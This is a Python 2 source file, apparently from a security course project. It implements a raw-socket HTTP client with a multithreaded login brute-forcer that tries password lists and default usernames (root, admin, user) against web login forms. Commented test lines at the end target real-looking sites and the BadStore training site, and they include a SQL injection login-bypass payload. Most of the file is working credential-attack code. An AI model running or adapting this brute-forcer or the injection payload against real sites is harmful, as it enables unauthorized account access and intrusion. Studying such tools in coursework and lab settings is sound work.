import re
import threading
import time
from threading import Thread
import socket
from urlparse import urlparse
from bs4 import BeautifulSoup
from postInfo import postInfo
from ssl import wrap_socket

standard_users= ['root', 'admin', 'user']
attempts = []
success = False
login_cred = ""
pattern = re.compile("([4-5]..)")
class Requester:
    global pattern
    initial_host = ""
    scheme = ""
    attempt_values = []
    host = ""
    user_agent = "CSE361-KappaBot"
    const = ("GET {0} HTTP/1.1\r\n"
                    "Host: {1}\r\n"
                    "User-Agent: {2}\r\n"
                    "Pragma: no-cache\r\n"
                    "Accept: text/plain, text/html\r\n"
                    "Accept-Language: en-US\r\n"
                    "Connection: Keep-Alive\r\n")
    def __init__(self, domain):
        self.initial_host = domain
        parsed_domain = urlparse(domain)
        self.host = parsed_domain.netloc
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(1)
        self.scheme = parsed_domain.scheme
        # Handle if connection not made
        if self.scheme.lower() == "https":
            self.sock = wrap_socket(self.sock)
            self.sock.connect((self.host, 443))
        else:
            self.sock.connect((self.host, 80))
    def __del__(self):
        self.sock.close()

    def get(self, url, cookies=None):
        #print "GET CALLED" + url
        # path =  url[url.find('/')+1:]
        # path = path[path.find('/')+1:]
        # path = path[path.find('/'):]
        path = urlparse(url).path.rstrip()

        header = self.const.format(str(path),self.host,self.user_agent)

        #"Cache-Control: no-cache, no-store, must-revalidate\r\n"
        if cookies:
            cookie_string = ""
            for key in cookies.keys():
                cookie_string += key + "=" + cookies[key]+ ';'
                cookie_string += " "
            header += "Cookie: {}".format(cookie_string[:-2])+"\r\n"
        header += "\r\n"
        self.sock.send(header)
        response_header = ""
        response = ""
        status_code = ""
        total = 0
        initial_response = self.sock.recv(4096)
        #print initial_response
        #Parse for header fields
        for s in initial_response.splitlines():
            response_header += s
            response_header += "\n"
            field =  s.strip().split(': ')
            if field[0] == 'Content-Length':
               total = int(field[1])
            elif 'HTTP/1.1' in field[0]:
                status_code = field[0].split()[1]
            elif field[0] == '':
                break
            #else if field[0] == 'Transfer-Encoding':
            #    if field[1] == 'chunked':
        #Parse Cookies
        #print response_header
        cookies = {}
        for field in response_header.split('\n'):
            if "Set-Cookie:" in  field:
                values = field[len("Set-Cookie: "):].split(';')
                pair = values[0].split('=')
                cookies[pair[0]] = pair[1]
        # print cookies
        # print response_header
        response = initial_response[initial_response.find('<html'):]
        #Handle Error Codes
        if(pattern.match(status_code)):
            return -1
        self.sock.send(header)
        #print header
        current_amount = len(response)
        #while current_amount < total:
        try:
            latest_response = self.sock.recv(1024)
            while latest_response.strip():
                current_amount = current_amount + len(latest_response)
                response += latest_response
                latest_response  = self.sock.recv(1024)
        except:
            #find HTML or html
            response = response[:response.find('</html>')+7]
        redirect = self.handle_redirect(response_header, cookies)
        if redirect:
            response = redirect
        #Return Object:
        # URL
        # cookies
        # respone body
        # **user_name
        # **password
        result = postInfo(url, cookies, response)
        return result

    def post(self, info, fields):
        #iterating through fields and adding to body of post
        #field dictionary in post
        #print info.url
        path = urlparse(info.url).path
        #print "PATH " + str(path)
        # Build request body
        body = ""
        for key in fields.keys():
            body += "&"
            body += str(key) + "=" + str(fields[key])
        body = body[1:]
        header = ("POST {} HTTP/1.1\r\n"
                "Host: {}\r\n"
                "User-Agent: {}\r\n"
                "Accept: text/plain, text/html\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: {}\r\n"
                "Connection: Keep-Alive\r\n"
                ).format(path,self.host,self.user_agent,len(body))
        if info.cookies:
            cookie_string = ""
            for key in info.cookies.keys():
                cookie_string += key + "=" + info.cookies[key]+ ';'
                cookie_string += " "
            header += "Cookie: {}".format(cookie_string[:-2])+"\r\n"
        header += "\r\n"
        header += body + "\r\n\r\n"
        print header
        response = ""
        try:
            self.sock.send(header)
            latest_response = self.sock.recv(1024)
            while latest_response.strip():
                response += latest_response
                latest_response  = self.sock.recv(1024)
        except:
            #find HTML or html
            if response.find("<html>") != -1:
                response = response[:response.find('</html>')+7]
            #print response
        redirect = self.handle_redirect(response, info.cookies)
        if redirect:
            response = redirect

        return response

    def ATTACK(self, low, high, info, form_inputs, passwords, password_field):
        global attempts
        global success
        global login_cred
        global list_lock
        for i in range(low,high):
            #print success
            if success:
                return None
            query = form_inputs.copy()
            query[password_field] = passwords[i]
            attempts.append(passwords[i])
            r = Requester(self.initial_host)
            response = r.post(info, query)
            #print response
            redirect = self.handle_redirect(response)
            print "TRYING" + str(passwords[i])
            #print "REDIRECT? " + str(redirect)
            #print response.response_body
            #If response is redirect (3**) then call get on the url at location: xxxx
            #Else its probably js and just check the page returned for password
            if redirect:
                soup = BeautifulSoup(redirect.response_body, "html.parser")
            else:
                soup = BeautifulSoup(response, "html.parser")

            if soup.findAll(type ="password"):
                #False if Login successful(supposedly)
                continue
            else:
                login_cred = query
                success = True
        return None

    def bruteForceInit(self, url, user_list, keywords, action, login_field, password_field, login_form):
        global standard_users
        global login_cred
        credential_list = []
        if not user_list:
            print " Added Standard Users "
            user_list = user_list + standard_users
            print user_list
        for user in user_list:
            self.bruteForce(url, user, keywords, action, login_field, password_field, login_form)
            if login_cred:
                break
        return login_cred
#Returns Dictionary of correct credentials if successful bruteforce.
#Unsuccessful Bruteforces return null
    def bruteForce(self, url, username, keywords, action, login_field, password_field, login_form):
        #r = Requester(url)
        global attempts
        global login_cred
        #print "URL "+str(url)
        info  = self.get(url)
        #print info.url
        #Assume action doesnt have a slash
        if action[0] == '/':
            action = action[1:]
        info.url = info.url+action
        #Attempt to login
        query = {}
        #Only works for one username
        login_form[login_field] = username
        threads = []
        for i in range(4):
            low = (len(keywords)/4)*i
            high = (len(keywords)/4)*(i+1)
            threads.append(Thread(target=self.ATTACK, args=(low, high, info, login_form, keywords, password_field)))
            threads[i].start()
        for t in threads:
            t.join()
        self.attempt_values =  self.attempt_values + attempts
        return login_cred

    def handle_redirect(self, response, cookies= None):
        status = re.compile('3\d{2}')
        response_code = response.splitlines()[0]
        #print response_code
        redirect = status.search(response_code)
        #print redirect
        #print response
        if redirect:
            new_host_index = response.find("Location: ") + len("Location: ")
            new_host_end = response[new_host_index:].find('\n') + new_host_index
            new_host = response[new_host_index:new_host_end]
            if self.host == urlparse(new_host).netloc:
                new_response = self.get(new_host, cookies)
                return new_response.response_body
            elif not urlparse(new_host).netloc: # only has relativepath
                if new_host.startswith('/'):
                    new_host = self.scheme + '://' +  self.host + new_host
                else:
                    new_host = self.scheme + '://' + self.host + '/' + new_host
                new_host= ''.join(new_host.split())
                print new_host
                new_response = self.get(new_host, cookies)
                return new_response.response_body

        return False


#path = 'http://austinchildrensacademy.org'
#r =  Requester('http://www.badstore.net')
#info = r.get('http://shop.nhl.com')
#r.post(info, {"Hello":"World", "foo":"bar"})
#path = 'http://austinchildrensacademy.org/about-aca/'
#print r.get('http://wwww.badstore.net/cgi-bin/badstore.cgi')
#print requests.get('http://www.badstore.net/cgi-bin/badstore.cgi?action=loginregister').content

#print '\n'
#print r.get('http://www.badstore.net/cgi-bin/badstore.cgi?action=loginregister')
#info = postInfo('/cgi-bin/badstore.cgi?action=loginregister','','')
#print r.post(info,fields = {'email': 'admin\' AND 1=1 -- ', 'password': ''})

